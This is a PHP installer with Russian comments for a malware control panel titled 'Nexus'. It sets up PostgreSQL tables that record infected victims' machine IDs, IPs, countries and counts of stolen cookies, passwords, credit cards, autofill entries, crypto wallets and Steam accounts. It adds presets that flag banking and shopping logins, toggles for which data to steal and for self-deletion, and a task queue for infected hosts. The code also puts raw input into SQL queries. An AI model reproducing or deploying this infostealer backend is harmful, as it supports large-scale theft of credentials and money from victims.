<?php
ini_set('display_errors', 'On');
error_reporting(E_ALL);

if(isset($_GET['submit'])){
    $dbname = $_GET['dbname'];
    $dbhost = $_GET['dbhost'];
    $dbuser = $_GET['dbuser'];
    $dbpass = $_GET['dbpass'];
    $user = $_GET['name'];
    $pass = $_GET['pass'];

    try {
        // Используем PostgreSQL (например, PDO для PostgreSQL)
        $db = new PDO("pgsql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass);
    } catch(Exception $e) {
        echo "Ошибка подключения: " . $e->getMessage();
        $db = NULL;
    }

    if($db) {
        // Устанавливаем настройки для базы данных PostgreSQL
        $db->query("SET timezone TO 'UTC';");

        // Создание таблиц в PostgreSQL
        $db->query("CREATE TABLE IF NOT EXISTS grabber (
            id SERIAL PRIMARY KEY,
            name TEXT NOT NULL,
            folder TEXT NOT NULL,
            pattern TEXT NOT NULL,
            exception TEXT NOT NULL
        );");

        $db->query("CREATE TABLE IF NOT EXISTS logs (
            id SERIAL PRIMARY KEY,
            userID TEXT NOT NULL,
            hwid TEXT NOT NULL,
            system TEXT NOT NULL,
            ip TEXT NOT NULL,
            country TEXT NOT NULL,
            date TEXT NOT NULL,
            count INT DEFAULT NULL,
            cookie INT DEFAULT NULL,
            pswd INT DEFAULT NULL,
            buildversion TEXT,
            credit INT DEFAULT 0,
            autofill INT DEFAULT 0,
            wallets INT DEFAULT 0,
            checked INT NOT NULL DEFAULT 0,
            comment TEXT NOT NULL,
            preset TEXT,
            steam INT DEFAULT NULL
        );");

        $db->query("CREATE TABLE IF NOT EXISTS presets (
            id SERIAL PRIMARY KEY,
            name TEXT NOT NULL,
            color TEXT NOT NULL,
            pattern TEXT NOT NULL
        );");

        // Вставляем данные в таблицу presets
        $db->query("INSERT INTO presets (name, color, pattern) VALUES
            ('Shop', 'green', 'amazon;ebay;walmart;newegg;apple;bestbuy'),
            ('Money', 'GOLD', 'paypal;chase.com;TD;wells;capitalone;skrill;PayU')
        ON CONFLICT (name) DO NOTHING;"); // Уникальность для предотвращения дублирования.

        $db->query("CREATE TABLE IF NOT EXISTS tasks (
            id SERIAL PRIMARY KEY,
            name TEXT NOT NULL,
            count INT NOT NULL,
            country TEXT NOT NULL,
            task TEXT NOT NULL,
            preset TEXT NOT NULL,
            params TEXT NOT NULL,
            status INT NOT NULL
        );");

        $db->query("CREATE TABLE IF NOT EXISTS settings (
            id SERIAL PRIMARY KEY,
            cisLogs TEXT NOT NULL,
            repeatLogs TEXT NOT NULL,
            telegram TEXT NOT NULL,
            history TEXT NOT NULL,
            autocomplete TEXT NOT NULL,
            cards TEXT NOT NULL,
            cookies TEXT NOT NULL,
            passwords TEXT NOT NULL,
            jabber TEXT NOT NULL,
            ftp TEXT NOT NULL,
            screenshot TEXT NOT NULL,
            selfDelete TEXT NOT NULL,
            vpn TEXT NOT NULL,
            grabber TEXT NOT NULL,
            executionTime TEXT NOT NULL
        );");

        $db->query("INSERT INTO settings (cisLogs, repeatLogs, telegram, history, autocomplete, cards, cookies, passwords, jabber, ftp, screenshot, selfDelete, vpn, grabber, executionTime) VALUES
            ('on', 'on', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', '0');");

        $db->query("CREATE TABLE IF NOT EXISTS usr (
            name TEXT NOT NULL,
            pass TEXT NOT NULL
        );");

        // Шифруем пароль пользователя
        $e = sha($user, $pass);
        $db->query("INSERT INTO usr (name, pass) VALUES ('$user', '$e');");

        // Генерируем файл для подключения к базе данных
        $fd = fopen("database.php", 'w');
        $content = "<?php
\$user = \"$dbuser\";
\$password = \"$dbpass\";
\$host = \"$dbhost\";
\$db_name = \"$dbname\";
\$pdoConnection = new PDO(\"pgsql:host=\$host;dbname=\$db_name\", \$user, \$password);
?>";
        fwrite($fd, $content);
        fclose($fd);

        // Перенаправление на страницу установки
        header("Location:index.php", true, 301);
    }
}

function sha($user, $p) {
    $method = 'aes-128-ctr';
    $key = openssl_digest($user, 'SHA256', TRUE);
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length($method));
    $crypt = openssl_encrypt($p, $method, $key, 0, $iv) . "::" . bin2hex($iv);
    unset($token, $method, $key, $iv);
    return $crypt;
}
?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="css/i.css">
    <title>Nexus:Installation</title>

</head>
<body>
<form>
    <div>
        <p>
            <label>Database name</label>
            <input type="text" name="dbname" required pattern="[A-za-z0-9_]+" placeholder="nexus"><span></span>
        </p>

        <p>
            <label>Database address</label>
            <input type="text" name="dbhost" required pattern="[A-za-z0-9\W]+" placeholder="localhost"><span></span>
        </p>

        <p>
            <label>Database user</label>
            <input type="text" name="dbuser" required pattern="[A-za-z0-9_]+" placeholder="root"><span></span>
        </p>

        <p>
            <label>Database password</label>
            <input type="password" name="dbpass" required ><span></span>
        </p>

        <p>
            <label>Username</label>
            <input type="text" name="name"  required  placeholder="user_123"><span></span>
        </p>

        <p>
            <label>Password</label>
            <input type="password" name="pass" required ><span></span>
        </p>
    </div>
    <footer>
        <button type="submit" name="submit">Install</button>
    </footer>
</form>
</body>
</html>